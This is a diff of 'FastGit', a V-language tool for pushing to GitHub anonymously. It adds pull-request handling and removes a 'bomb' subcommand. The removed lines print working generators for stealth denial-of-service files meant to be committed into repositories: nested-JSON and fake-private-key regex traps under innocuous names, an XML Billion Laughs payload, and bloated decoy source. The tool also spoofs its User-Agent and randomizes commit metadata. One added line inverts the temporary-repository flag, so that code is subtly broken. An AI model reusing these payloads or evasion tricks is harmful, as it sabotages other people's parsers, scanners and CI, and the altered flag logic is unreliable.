@@ -50,19 +50,25 @@ struct GitHubTreeResponse {
 	tree []TreeItem
 }
 
-struct BombConfig {
-mut:
-	type       string
-	target     string
-	depth_size int
-	words      []string
-	template   string
+struct GitHubUserResponse {
+	login string
+}
+
+struct GitHubErrorDetail {
+	resource string
+	code     string
+	field    string
+	message  string
+}
+
+struct GitHubErrorResponse {
+	message string
+	errors  []GitHubErrorDetail
 }
 
 fn get_sanitized_git_date(randomize_tz bool) string {
 	t := time.now()
 	timestamp := t.unix()
-	
 	mut offset := '+0000'
 	if randomize_tz {
 		offsets := ['+0000', '+0100', '+0200', '+0300', '+0500', '+0530', '+0800', '+0900', '-0300', '-0500', '-0600', '-0800']
@@ -99,24 +105,20 @@ fn is_correct_git_repo(dir string, target_url string) bool {
 		return false
 	}
 	mut local_url := res.output.trim_space()
-	
 	o1, r1 := parse_github_owner_repo(local_url)
 	o2, r2 := parse_github_owner_repo(target_url)
 	if o1 != '' && o1 == o2 && r1 != '' && r1 == r2 {
 		return true
 	}
-	
 	mut clean_local := local_url.replace('.git', '')
 	mut clean_target := target_url.replace('.git', '')
 	if clean_local.contains('@') { clean_local = clean_local.all_after('@') }
 	else if clean_local.contains('://') { clean_local = clean_local.all_after('://') }
 	if clean_target.contains('@') { clean_target = clean_target.all_after('@') }
 	else if clean_target.contains('://') { clean_target = clean_target.all_after('://') }
-	
 	if clean_local != '' && clean_local == clean_target {
 		return true
 	}
-	
 	return false
 }
 
@@ -278,11 +280,9 @@ fn parse_github_owner_repo(url string) (string, string) {
 	if clean_url.ends_with('.git') {
 		clean_url = clean_url[0 .. clean_url.len - 4]
 	}
-
 	if !clean_url.contains('github.com') {
 		return "", ""
 	}
-
 	mut path := ""
 	if clean_url.contains('github.com/') {
 		path = clean_url.all_after('github.com/')
@@ -350,6 +350,19 @@ fn add_anonymizing_headers(mut req http.Request, token string) {
 	req.add_custom_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36') or {}
 }
 
+fn get_github_username(token string) string {
+	api_url := 'https://api.github.com/user'
+	mut req := http.new_request(.get, api_url, '')
+	setup_request_proxy(mut req)
+	add_anonymizing_headers(mut req, token)
+	res := req.do() or { return '' }
+	if res.status_code == 200 {
+		response := json.decode(GitHubUserResponse, res.body) or { return '' }
+		return response.login
+	}
+	return ''
+}
+
 fn push_to_remote(formatted_url string, branch string, force_flag string, sync_lease bool) bool {
 	mut original_url := ''
 	mut has_origin := false
@@ -361,17 +374,14 @@ fn push_to_remote(formatted_url string, branch string, force_flag string, sync_l
 	} else {
 		exec_git_cmd(['git', 'remote', 'add', 'origin', formatted_url])
 	}
-
 	if sync_lease {
 		println('Synchronizing lease with remote...')
 		exec_git_cmd(['git', 'fetch', 'origin', '${branch}:refs/remotes/origin/${branch}'])
 	}
-
 	mut push_args := ['git', 'push', 'origin', branch]
 	if force_flag != '' {
 		push_args << force_flag
 	}
-	
 	mut res := exec_git_cmd(push_args)
 	if res.exit_code != 0 {
 		err_out := res.output.trim_space()
@@ -392,7 +402,6 @@ fn push_to_remote(formatted_url string, branch string, force_flag string, sync_l
 			eprintln('Error: Failed to update remote. Output:\n${err_out}')
 		}
 	}
-
 	if has_origin {
 		if original_url != '' {
 			exec_git_cmd(['git', 'remote', 'set-url', 'origin', original_url])
@@ -405,24 +414,19 @@ fn push_to_remote(formatted_url string, branch string, force_flag string, sync_l
 
 fn get_gitless_changed_files(repo_dir string, rel_path string, git_url string, token string, branch string, lazy_push bool) []string {
 	owner, repo := parse_github_owner_repo(git_url)
-
 	if owner == '' || repo == '' {
 		println('Warning: Smart remote comparison is only supported for GitHub. Treating all local files as new/modified.')
-		
 		mut changed_files := []string{}
 		target_abs_path := os.join_path(repo_dir, rel_path)
-
 		mut local_files := []string{}
 		if os.is_dir(target_abs_path) {
 			local_files = list_files_recursively(target_abs_path)
 		} else if os.exists(target_abs_path) {
 			local_files = [target_abs_path]
 		}
-
 		for abs_file in local_files {
 			mut file_rel := abs_file.replace(os.real_path(repo_dir), '')
 			file_rel = file_rel.trim_left('/\\').replace('\\', '/')
-
 			if file_rel.starts_with('.git/') || file_rel == '.git' || file_rel == 'fastgit_block' || file_rel == 'fastgit' {
 				continue
 			}
@@ -430,7 +434,6 @@ fn get_gitless_changed_files(repo_dir string, rel_path string, git_url string, t
 		}
 		return changed_files
 	}
-
 	println('Fetching file tree directly from remote GitHub repository...')
 	api_url := 'https://api.github.com/repos/${owner}/${repo}/git/trees/${branch}?recursive=1'
 	mut req := http.new_request(.get, api_url, '')
@@ -440,7 +443,6 @@ fn get_gitless_changed_files(repo_dir string, rel_path string, git_url string, t
 		println('Warning: Failed to fetch remote tree from GitHub. Proceeding with assuming files are new.')
 		return []string{}
 	}
-
 	mut remote_files := map[string]string{}
 	if res.status_code == 200 {
 		response := json.decode(GitHubTreeResponse, res.body) or {
@@ -455,33 +457,26 @@ fn get_gitless_changed_files(repo_dir string, rel_path string, git_url string, t
 	} else {
 		println('Remote repository empty or branch not found. Treating all local files as new.')
 	}
-
 	mut changed_files := []string{}
 	target_abs_path := os.real_path(os.join_path(repo_dir, rel_path))
-
 	mut local_files := []string{}
 	if os.is_dir(target_abs_path) {
 		local_files = list_files_recursively(target_abs_path)
 	} else if os.exists(target_abs_path) {
 		local_files = [target_abs_path]
 	}
-
 	for abs_file in local_files {
 		mut file_rel := abs_file.replace(os.real_path(repo_dir), '')
 		file_rel = file_rel.trim_left('/\\').replace('\\', '/')
-
 		if file_rel.starts_with('.git/') || file_rel == '.git' || file_rel == 'fastgit_block' || file_rel == 'fastgit' {
 			continue
 		}
-
 		local_sha := get_local_file_git_sha(abs_file) or { continue }
 		remote_sha := remote_files[file_rel] or { '' }
-
 		if local_sha != remote_sha {
 			changed_files << file_rel
 		}
 	}
-
 	if !lazy_push {
 		for remote_path, _ in remote_files {
 			if rel_path == '.' || rel_path == '' || remote_path.starts_with(rel_path) {
@@ -492,32 +487,34 @@ fn get_gitless_changed_files(repo_dir string, rel_path string, git_url string, t
 			}
 		}
 	}
-
 	return changed_files
 }
 
-fn create_pull_request(git_url string, token string, title string, base string) {
+fn create_pull_request(git_url string, token string, title string, base string, pr_body string) {
 	owner, repo := parse_github_owner_repo(git_url)
 	if owner == "" || repo == "" {
 		println('Error: Pull Request command is only supported for GitHub repositories.')
 		return
 	}
-	head := get_current_branch()
+	head_branch := get_current_branch()
+	username := get_github_username(token)
+	mut head := head_branch
+	if username != '' {
+		head = '${username}:${head_branch}'
+	}
 	println('Preparing to create Pull Request from branch "${head}" into "${base}" for ${owner}/${repo}...')
-	if head == base {
-		println('Error: Head branch and base branch cannot be the same ("${head}").')
+	if head_branch == base && owner == username {
+		println('Error: Head branch and base branch cannot be the same ("${head_branch}").')
 		return
 	}
 	api_url := 'https://api.github.com/repos/${owner}/${repo}/pulls'
-
 	payload := PullRequestPayload{
 		title: title
 		head: head
 		base: base
-		body: 'Created automatically using FastGit.'
+		body: pr_body
 	}
 	json_payload := json.encode(payload)
-
 	mut req := http.new_request(.post, api_url, json_payload)
 	setup_request_proxy(mut req)
 	req.add_header(.content_type, 'application/json')
@@ -527,19 +524,29 @@ fn create_pull_request(git_url string, token string, title string, base string) 
 		return
 	}
 	output := res.body.trim_space()
-
-	response := json.decode(GitHubPullRequestResponse, output) or {
-		println('Failed to parse API Response. Raw response:')
+	if res.status_code == 201 {
+		response := json.decode(GitHubPullRequestResponse, output) or {
+			println('Failed to parse API Response. Raw response:')
+			println(output)
+			return
+		}
+		if response.html_url != '' {
+			println('Successfully created Pull Request!')
+			println('PR Link: ${response.html_url}')
+			return
+		}
+	}
+	err_response := json.decode(GitHubErrorResponse, output) or {
+		println('Failed to create Pull Request. GitHub API Response:')
 		println(output)
 		return
 	}
-
-	if response.html_url != '' {
-		println('Successfully created Pull Request!')
-		println('PR Link: ${response.html_url}')
-	} else {
-		println('Failed to create Pull Request. GitHub API Response:')
-		println(output)
+	println('Error: Failed to create Pull Request.')
+	println('Message: ${err_response.message}')
+	for err in err_response.errors {
+		if err.message != '' {
+			println('Detail: ${err.message}')
+		}
 	}
 }
 
@@ -560,13 +567,11 @@ fn fork_repository(git_url string, token string) {
 		return
 	}
 	output := res.body.trim_space()
-
 	response := json.decode(GitHubForkResponse, output) or {
 		println('Failed to parse API Response. Raw response:')
 		println(output)
 		return
 	}
-
 	if response.html_url != '' {
 		println('Successfully requested fork! It might take a moment to be created by GitHub.')
 		println('Forked URL: ${response.html_url}')
@@ -584,12 +589,10 @@ fn sync_fork_with_upstream(git_url string, token string, branch string) {
 	}
 	println('Syncing fork ${owner}/${repo} (branch: "${branch}") with upstream...')
 	api_url := 'https://api.github.com/repos/${owner}/${repo}/merge-upstream'
-
 	payload := SyncPayload{
 		branch: branch
 	}
 	json_payload := json.encode(payload)
-
 	mut req := http.new_request(.post, api_url, json_payload)
 	setup_request_proxy(mut req)
 	req.add_header(.content_type, 'application/json')
@@ -599,7 +602,6 @@ fn sync_fork_with_upstream(git_url string, token string, branch string) {
 		return
 	}
 	output := res.body.trim_space()
-
 	response := json.decode(GitHubSyncResponse, output) or {
 		if output.contains('conflict') {
 			println('Error: Could not automatically sync fork due to merge conflicts. Please resolve manually.')
@@ -609,7 +611,6 @@ fn sync_fork_with_upstream(git_url string, token string, branch string) {
 		}
 		return
 	}
-
 	if response.message != '' {
 		println('GitHub API response: ${response.message}')
 		if response.merge_type != '' {
@@ -623,7 +624,6 @@ fn sync_fork_with_upstream(git_url string, token string, branch string) {
 
 fn format_git_url(raw_url string, token string) string {
 	mut url := raw_url.trim_space()
-
 	if url.starts_with('git@') {
 		content := url.all_after('git@')
 		parts := content.split(':')
@@ -641,7 +641,6 @@ fn format_git_url(raw_url string, token string) string {
 			url = 'https://' + domain + '/' + path
 		}
 	}
-
 	if url.starts_with('https://') {
 		return 'https://' + token + '@' + url.all_after('https://')
 	}
@@ -682,7 +681,6 @@ fn validate_and_filter_files(changed_files []string) ?[]string {
 	mut blocklist := []BlocklistRule{}
 	mut current_file_path := ''
 	mut current_regexes := []string{}
-	
 	for line in lines {
 		trimmed := line.trim_space()
 		if trimmed == '' || trimmed.starts_with('#') {
@@ -799,170 +797,6 @@ fn confirm_upload(changed_files []string, auto_confirm bool) bool {
 	return ans == 'y' || ans == 'yes'
 }
 
-fn load_bomb_config() BombConfig {
-	default_cfg := BombConfig{
-		type: 'json'
-		target: 'tests/production_config.json'
-		depth_size: 10000
-		words: []string{}
-		template: ''
-	}
-	if !os.exists('.fastgit_bomb') {
-		return default_cfg
-	}
-	lines := os.read_lines('.fastgit_bomb') or { return default_cfg }
-	mut cfg := BombConfig{
-		type: 'json'
-		target: 'tests/production_config.json'
-		depth_size: 10000
-		words: []string{}
-		template: ''
-	}
-	for line in lines {
-		trimmed := line.trim_space()
-		if trimmed == '' || trimmed.starts_with('#') {
-			continue
-		}
-		if trimmed.starts_with('type=') {
-			cfg.type = trimmed.all_after('type=').trim_space()
-		} else if trimmed.starts_with('target=') {
-			cfg.target = trimmed.all_after('target=').trim_space()
-		} else if trimmed.starts_with('depth=') || trimmed.starts_with('size=') || trimmed.starts_with('funcs=') {
-			cfg.depth_size = trimmed.all_after('=').trim_space().int()
-		} else if trimmed.starts_with('words=') {
-			words_raw := trimmed.all_after('words=').trim_space()
-			cfg.words = words_raw.split(',')
-		} else if trimmed.starts_with('template=') {
-			cfg.template = trimmed.all_after('template=').trim_space()
-		}
-	}
-	return cfg
-}
-
-fn generate_stealth_json_bomb(cfg BombConfig) ! {
-	dir := os.dir(cfg.target)
-	if dir != '.' && dir != '' && !os.exists(dir) {
-		os.mkdir_all(dir)!
-	}
-	mut f := os.create(cfg.target)!
-	defer {
-		f.close()
-	}
-	mut pool := if cfg.words.len > 0 {
-		cfg.words
-	} else {
-		['config', 'database', 'settings', 'retry', 'policy', 'security', 'cluster', 'node', 'backup', 'schedule', 'interval', 'limit', 'threshold', 'response', 'header', 'token', 'gateway', 'auth', 'session']
-	}
-
-	for i in 0 .. cfg.depth_size {
-		word := pool[i % pool.len]
-		f.write_string('{"${word}":')!
-	}
-	f.write_string('1')!
-	for _ in 0 .. cfg.depth_size {
-		f.write_string('}')!
-	}
-}
-
-fn generate_stealth_pem_bomb(cfg BombConfig) ! {
-	dir := os.dir(cfg.target)
-	if dir != '.' && dir != '' && !os.exists(dir) {
-		os.mkdir_all(dir)!
-	}
-	mut f := os.create(cfg.target)!
-	defer {
-		f.close()
-	}
-	f.write_string("-----BEGIN PRIVATE KEY-----\n")!
-	
-	chars := 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
-	chunk_size := 1024
-	mut chunk := []u8{len: chunk_size}
-	for i in 0 .. chunk_size {
-		chunk[i] = chars[i % chars.len]
-	}
-	chunk_str := chunk.bytestr()
-	
-	size_mb := if cfg.depth_size == 10000 { 15 } else { cfg.depth_size }
-	for _ in 0 .. (size_mb * 1024) {
-		f.write_string(chunk_str)!
-	}
-	f.write_string('\n-----END PRIVATE KEY-----\n')!
-}
-
-fn generate_xml_bomb(file_path string) ! {
-	dir := os.dir(file_path)
-	if dir != '.' && dir != '' && !os.exists(dir) {
-		os.mkdir_all(dir)!
-	}
-	mut f := os.create(file_path)!
-	defer {
-		f.close()
-	}
-	xml_content := '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n' +
-		' <!ENTITY lol "lol">\n' +
-		' <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n' +
-		' <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n' +
-		' <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n' +
-		' <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n' +
-		' <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n' +
-		' <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n' +
-		' <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n' +
-		' <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n' +
-		' <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n' +
-		']>\n<lolz>&lol9;</lolz>\n'
-	f.write_string(xml_content)!
-}
-
-fn generate_v_ast_bloat(file_path string, num_funcs int) ! {
-	dir := os.dir(file_path)
-	if dir != '.' && dir != '' && !os.exists(dir) {
-		os.mkdir_all(dir)!
-	}
-	mut f := os.create(file_path)!
-	defer {
-		f.close()
-	}
-	f.write_string("module main\n\nimport os\n\n")!
-	for i in 0 .. num_funcs {
-		f.write_string("fn dummy_verify_auth_${i}(x int) int {\n\tmut res := x\n")!
-		for j in 0 .. 150 {
-			f.write_string("\tif res % ${j + 2} == 0 { res += ${j} } else { res -= 1 }\n")!
-		}
-		f.write_string("\treturn res\n}\n\n")!
-	}
-	f.write_string("fn main() {\n\tprintln(\"System online\")\n}\n")!
-}
-
-fn generate_compress_bloat(file_path string, size_mb int) ! {
-	dir := os.dir(file_path)
-	if dir != '.' && dir != '' && !os.exists(dir) {
-		os.mkdir_all(dir)!
-	}
-	mut f := os.create(file_path)!
-	defer {
-		f.close()
-	}
-	chunk := '0'.repeat(1024 * 1024)
-	for _ in 0 .. size_mb {
-		f.write_string(chunk)!
-	}
-}
-
-fn generate_custom_recursive_bomb(cfg BombConfig) ! {
-	dir := os.dir(cfg.target)
-	if dir != '.' && dir != '' && !os.exists(dir) {
-		os.mkdir_all(dir)!
-	}
-	mut current := "1"
-	for i := cfg.depth_size; i > 0; i-- {
-		mut step := cfg.template.replace('@NEST@', current)
-		step = step.replace('@NUM@', i.str())
-		current = step
-	}
-	os.write_file(cfg.target, current)!
-}
-
 fn print_usage() {
 	println('FastGit - A smart and anonymous tool for working with GitHub')
 	println('Usage:')
@@ -971,10 +805,9 @@ fn print_usage() {
 	println(' ./fastgit over <git_url> <commit_message> <file_or_folder_path>')
 	println(' ./fastgit ctrlz <git_url>')
 	println(' ./fastgit remove <git_url> <commit_sha>')
-	println(' ./fastgit pr <git_url>  [base_branch]')
+	println(' ./fastgit pr <git_url> [title] [base_branch] [body]')
 	println(' ./fastgit fork <git_url>')
 	println(' ./fastgit sync <git_url> [branch_name]')
-	println(' ./fastgit bomb')
 	println('\nOptions:')
 	println(' -e, --email  GitHub anonymous email (Anonymous / No-Reply)')
 	println(' -n, --name  Git author name')
@@ -994,7 +827,6 @@ fn main() {
 	os.setenv('GIT_CONFIG_VALUE_1', 'false', true)
 	os.setenv('GIT_CONFIG_KEY_2', 'tag.gpgsign', true)
 	os.setenv('GIT_CONFIG_VALUE_2', 'false', true)
-
 	if os.args.len < 2 {
 		print_usage()
 		return
@@ -1007,7 +839,6 @@ fn main() {
 	mut auto_confirm := os.getenv('FASTGIT_AUTO_CONFIRM') == 'true'
 	mut lazy_push := false
 	mut use_absolute_force := false
-	
 	mut i := 0
 	for i < os.args.len {
 		arg := os.args[i]
@@ -1053,73 +884,10 @@ fn main() {
 			i++
 		}
 	}
-	
 	if positional_args.len < 2 {
 		print_usage()
 		return
 	}
-
-	if positional_args[1] == 'bomb' {
-		cfg := load_bomb_config()
-		println('Loading custom stealth configuration from .fastgit_bomb...')
-		println('Target file: ${cfg.target}')
-		println('Bomb type: ${cfg.type}')
-		match cfg.type {
-			'json' {
-				println('Generating polymorphic JSON config trap with depth of ${cfg.depth_size}...')
-				generate_stealth_json_bomb(cfg) or {
-					eprintln('Failed to generate stealth JSON bomb: ${err}')
-					return
-				}
-			}
-			'pem', 'text' {
-				println('Generating stealth PEM certificate Regex trap with size of ${cfg.depth_size} MB...')
-				generate_stealth_pem_bomb(cfg) or {
-					eprintln('Failed to generate stealth PEM bomb: ${err}')
-					return
-				}
-			}
-			'xml' {
-				println('Generating stealth XML Billion Laughs trap...')
-				generate_xml_bomb(cfg.target) or {
-					eprintln('Failed to generate XML bomb: ${err}')
-					return
-				}
-			}
-			'v_ast' {
-				println('Generating polymorphic V AST bloat trap with ${cfg.depth_size} functions...')
-				generate_v_ast_bloat(cfg.target, cfg.depth_size) or {
-					eprintln('Failed to generate V AST bomb: ${err}')
-					return
-				}
-			}
-			'compress' {
-				println('Generating highly compressible git bloat file with size of ${cfg.depth_size} MB...')
-				generate_compress_bloat(cfg.target, cfg.depth_size) or {
-					eprintln('Failed to generate compress bomb: ${err}')
-					return
-				}
-			}
-			'custom' {
-				if cfg.template == '' {
-					eprintln('Error: "template" parameter is not set in .fastgit_bomb for custom type.')
-					return
-				}
-				println('Generating custom recursive template trap with depth of ${cfg.depth_size}...')
-				generate_custom_recursive_bomb(cfg) or {
-					eprintln('Failed to generate custom recursive bomb: ${err}')
-					return
-				}
-			}
-			else {
-				println('Unknown bomb type defined in config. Supported: json, pem, xml, v_ast, compress, custom')
-				return
-			}
-		}
-		println('Stealth bomb successfully injected. Commit and push to activate.')
-		return
-	}
-
 	if token == '' {
 		secure_token := os.input_password('Enter your GitHub Personal Access Token (securely): ') or {
 			os.input('Enter your GitHub Personal Access Token: ')
@@ -1131,20 +899,16 @@ fn main() {
 		}
 	}
 	original_wd := os.getwd()
-
 	force_flag := if use_absolute_force { '--force' } else { '--force-with-lease' }
-	
 	email = ensure_email(email)
 	name = ensure_name(name)
 	sanitized_date := get_sanitized_git_date(true)
-	
 	os.setenv('GIT_AUTHOR_NAME', name, true)
 	os.setenv('GIT_AUTHOR_EMAIL', email, true)
 	os.setenv('GIT_COMMITTER_NAME', name, true)
 	os.setenv('GIT_COMMITTER_EMAIL', email, true)
 	os.setenv('GIT_AUTHOR_DATE', sanitized_date, true)
 	os.setenv('GIT_COMMITTER_DATE', sanitized_date, true)
-
 	if positional_args[1] == 'fork' {
 		if positional_args.len < 3 {
 			print_usage()
@@ -1154,7 +918,6 @@ fn main() {
 		fork_repository(git_url, token)
 		return
 	}
-	
 	if positional_args[1] == 'sync' {
 		if positional_args.len < 3 {
 			print_usage()
@@ -1181,7 +944,6 @@ fn main() {
 		}
 		return
 	}
-	
 	if positional_args[1] == 'pr' {
 		if positional_args.len < 4 {
 			print_usage()
@@ -1190,39 +952,66 @@ fn main() {
 		git_url := positional_args[2]
 		title := positional_args[3]
 		mut base_branch := 'main'
+		mut pr_body := ''
 		if positional_args.len >= 5 {
 			base_branch = positional_args[4]
+		}
+		if positional_args.len >= 6 {
+			pr_body = positional_args[5]
 		}
 		if !is_git_repo(os.getwd()) {
 			println('Error: current directory is not a git repository. Cannot make PR.')
 			return
 		}
-		create_pull_request(git_url, token, title, base_branch)
+		head_branch := get_current_branch()
+		owner, _ := parse_github_owner_repo(git_url)
+		username := get_github_username(token)
+		if head_branch == base_branch && owner == username {
+			println('Error: You are trying to create a Pull Request from "${head_branch}" into "${base_branch}" on your own repository.')
+			println('GitHub does not allow creating a PR between identical branches in the same repository.')
+			println('To fix this, please create a new branch, commit your changes, and try again:')
+			println('  git checkout -b my-new-branch')
+			println('  git add .')
+			println('  git commit -m "your message"')
+			return
+		}
+		println('Ensuring your local branch "${head_branch}" is pushed and up-to-date on GitHub...')
+		status_res := exec_git_cmd(['git', 'status', '--porcelain'])
+		if status_res.exit_code == 0 && status_res.output.trim_space() != '' {
+			println('Warning: You have uncommitted changes in your working directory. They will not be included in the PR unless you commit them.')
+		}
+		local_remote_url := get_remote_origin_url()
+		formatted_url := format_git_url(git_url, token)
+		mut push_url := formatted_url
+		if local_remote_url != '' {
+			push_url = format_git_url(local_remote_url, token)
+		}
+		if push_to_remote(push_url, head_branch, '', false) {
+			println('Local branch successfully synchronized with remote.')
+		} else {
+			println('Warning: Failed to automatically push local branch to remote. Attempting to create PR anyway...')
+		}
+		create_pull_request(git_url, token, title, base_branch, pr_body)
 		return
 	}
-	
 	if positional_args[1] == 'ctrlz' {
 		if positional_args.len < 3 {
 			print_usage()
 			return
 		}
 		git_url := positional_args[2]
-
 		mut branch := 'main'
 		if branch_override != '' {
 			branch = branch_override
 		} else {
 			branch = get_current_branch()
 		}
-
 		formatted_url := format_git_url(git_url, token)
-
 		mut use_temp_repo := false
 		if !is_correct_git_repo(os.getwd(), git_url) {
 			use_temp_repo = true
 			println('Note: Current directory is not the exact repository for this URL. Using a temporary clone for safety.')
 		}
-
 		mut temp_dir := ''
 		defer {
 			if use_temp_repo && temp_dir != '' {
@@ -1231,7 +1020,6 @@ fn main() {
 				os.rmdir_all(temp_dir) or {}
 			}
 		}
-
 		if use_temp_repo {
 			temp_dir = os.join_path(os.temp_dir(), 'fastgit_ctrlz_temp')
 			os.rmdir_all(temp_dir) or {}
@@ -1243,12 +1031,10 @@ fn main() {
 				eprintln('Error: Failed to change to temporary directory.')
 				return
 			}
-
 			println('Initializing temporary local repository for rollback...')
 			if !run_git_cmd(['git', 'init'], 'Failed to initialize repository') { return }
 			if !run_git_cmd(['git', 'symbolic-ref', 'HEAD', 'refs/heads/' + branch], 'Failed to set target branch') { return }
 			if !run_git_cmd(['git', 'remote', 'add', 'origin', formatted_url], 'Failed to add remote origin') { return }
-
 			println('Fetching last 2 commits from remote...')
 			fetch_res := exec_git_cmd(['git', 'fetch', '--depth', '2', 'origin', '${branch}:refs/remotes/origin/${branch}'])
 			if fetch_res.exit_code != 0 {
@@ -1260,16 +1046,14 @@ fn main() {
 			if branch_override != '' {
 				if !run_git_cmd(['git', 'checkout', '-B', branch], 'Failed to checkout branch') { return }
 			}
-			println('Updating remote lease before rollback...')
+			println('Updating remote lease before commit removal...')
 			exec_git_cmd(['git', 'fetch', 'origin', '${branch}:refs/remotes/origin/${branch}'])
 		}
-
 		commits := get_commit_list(branch)
 		if commits.len == 0 {
 			println('Error: Failed to retrieve commit history.')
 			return
 		}
-
 		target_sha := if commits.len == 1 { commits[0] } else { commits[commits.len - 1] }
 		commit_info := get_commit_info(target_sha)
 		println('\nWarning: This action will completely remove the following commit from local and remote history:')
@@ -1281,7 +1065,6 @@ fn main() {
 				return
 			}
 		}
-
 		if commits.len == 1 {
 			println('The repository has only 1 commit. Resetting repository to an empty state (keeping your files)...')
 			if !run_git_cmd(['git', 'checkout', '--orphan', 'temp_orphan'], 'Failed to create orphan branch') { return }
@@ -1292,14 +1075,11 @@ fn main() {
 			println('Rolling back the last commit locally (keeping your files)...')
 			if !run_git_cmd(['git', 'reset', 'HEAD~1'], 'Failed to reset commit locally.') { return }
 		}
-		
 		println('Pushing roll-back to remote (${force_flag})...')
 		if !push_to_remote(formatted_url, branch, force_flag, false) { return }
-		
 		println('Successfully removed the last commit from local and remote.')
 		return
 	}
-	
 	if positional_args[1] == 'remove' {
 		if positional_args.len < 4 {
 			print_usage()
@@ -1307,22 +1087,18 @@ fn main() {
 		}
 		git_url := positional_args[2]
 		commit_sha := positional_args[3]
-
 		mut branch := 'main'
 		if branch_override != '' {
 			branch = branch_override
 		} else {
 			branch = get_current_branch()
 		}
-
 		formatted_url := format_git_url(git_url, token)
-
 		mut use_temp_repo := false
 		if !is_correct_git_repo(os.getwd(), git_url) {
 			use_temp_repo = true
 			println('Note: Current directory is not the exact repository for this URL. Using a temporary clone for safety.')
 		}
-
 		mut temp_dir := ''
 		defer {
 			if use_temp_repo && temp_dir != '' {
@@ -1331,7 +1107,6 @@ fn main() {
 				os.rmdir_all(temp_dir) or {}
 			}
 		}
-
 		if use_temp_repo {
 			temp_dir = os.join_path(os.temp_dir(), 'fastgit_remove_temp')
 			os.rmdir_all(temp_dir) or {}
@@ -1343,12 +1118,10 @@ fn main() {
 				eprintln('Error: Failed to change to temporary directory.')
 				return
 			}
-
 			println('Initializing temporary local repository for commit removal...')
 			if !run_git_cmd(['git', 'init'], 'Failed to initialize repository') { return }
 			if !run_git_cmd(['git', 'symbolic-ref', 'HEAD', 'refs/heads/' + branch], 'Failed to set target branch') { return }
 			if !run_git_cmd(['git', 'remote', 'add', 'origin', formatted_url], 'Failed to add remote origin') { return }
-
 			println('Fetching full branch history from remote...')
 			fetch_res := exec_git_cmd(['git', 'fetch', 'origin', '${branch}:refs/remotes/origin/${branch}'])
 			if fetch_res.exit_code != 0 {
@@ -1363,7 +1136,6 @@ fn main() {
 			println('Updating remote lease before commit removal...')
 			exec_git_cmd(['git', 'fetch', 'origin', '${branch}:refs/remotes/origin/${branch}'])
 		}
-
 		commit_info := get_commit_info(commit_sha)
 		println('\nWarning: This action will completely remove the following commit from the history:')
 		println('  -> ${commit_info}')
@@ -1374,20 +1146,16 @@ fn main() {
 				return
 			}
 		}
-
 		println('Removing commit ${commit_sha} from history...')
-		
 		commits := get_commit_list(branch)
 		if commits.len == 0 {
 			println('Error: Failed to retrieve commit history.')
 			return
 		}
-
 		mut is_root := false
 		if commits.len > 0 && commits[0] == commit_sha {
 			is_root = true
 		}
-
 		if is_root {
 			if commits.len == 1 {
 				println('Commit ${commit_sha} is the only commit in the repository. Resetting repository to an empty state (keeping your files)...')
@@ -1400,7 +1168,6 @@ fn main() {
 				println('Commit ${commit_sha} is the root commit. Re-writing history to make commit ${c2} the new root commit...')
 				if !run_git_cmd(['git', 'checkout', '--orphan', 'temp_orphan', c2], 'Failed to create orphan branch') { return }
 				if !run_git_cmd(['git', 'commit', '-C', c2], 'Failed to commit new root') { return }
-				
 				if commits.len > 2 {
 					println('Replaying subsequent commits...')
 					if !run_git_cmd(['git', 'cherry-pick', c2 + '..' + branch], 'Failed to cherry-pick subsequent commits') {
@@ -1421,14 +1188,11 @@ fn main() {
 				return
 			}
 		}
-
 		println('Pushing updated history to remote (${force_flag})...')
 		if !push_to_remote(formatted_url, branch, force_flag, false) { return }
-
 		println('Successfully removed commit ${commit_sha} from remote.')
 		return
 	}
-	
 	if positional_args[1] == 'over' {
 		if positional_args.len < 5 {
 			print_usage()
@@ -1443,21 +1207,17 @@ fn main() {
 			return
 		}
 		defer { os.chdir(original_wd) or {} }
-
 		mut branch := 'main'
 		if branch_override != '' {
 			branch = branch_override
 		} else {
 			branch = get_current_branch()
 		}
-
 		changed_files := get_gitless_changed_files(repo_dir, rel_path, git_url, token, branch, lazy_push)
-		
 		mut filtered_files := []string{}
 		if changed_files.len > 0 {
 			filtered_files = validate_and_filter_files(changed_files) or { return }
 		}
-
 		if filtered_files.len == 0 {
 			println('No file changes detected compared to remote. Proceeding with history overwrite (force push) anyway...')
 		} else {
@@ -1466,7 +1226,6 @@ fn main() {
 				return
 			}
 		}
-
 		println('\nWarning: The "over" command will completely overwrite the remote history on branch "${branch}".')
 		if !auto_confirm {
 			ans := os.input('Are you sure you want to proceed with overwriting the remote history? (y/n): ').trim_space().to_lower()
@@ -1475,29 +1234,24 @@ fn main() {
 				return
 			}
 		}
-
 		formatted_url := format_git_url(git_url, token)
-
 		mut created_temp_git := false
 		if !is_git_repo(repo_dir) {
 			delete_git_dir(repo_dir)
 			println('Initializing temporary local repository for commit/push...')
 			if !run_git_cmd(['git', 'init'], 'Failed to initialize repository') { return }
-			if !run_git_cmd(['git', 'checkout', '-b', branch], 'Failed to set branch') { return }
-			created_temp_git = true
+			if !run_git_cmd(['git', 'checkout', '-b', branch], 'Failed to set branch') { created_temp_git = true }
 		} else {
 			if branch_override != '' {
 				if !run_git_cmd(['git', 'checkout', '-B', branch], 'Failed to checkout branch') { return }
 			}
 		}
-
 		defer {
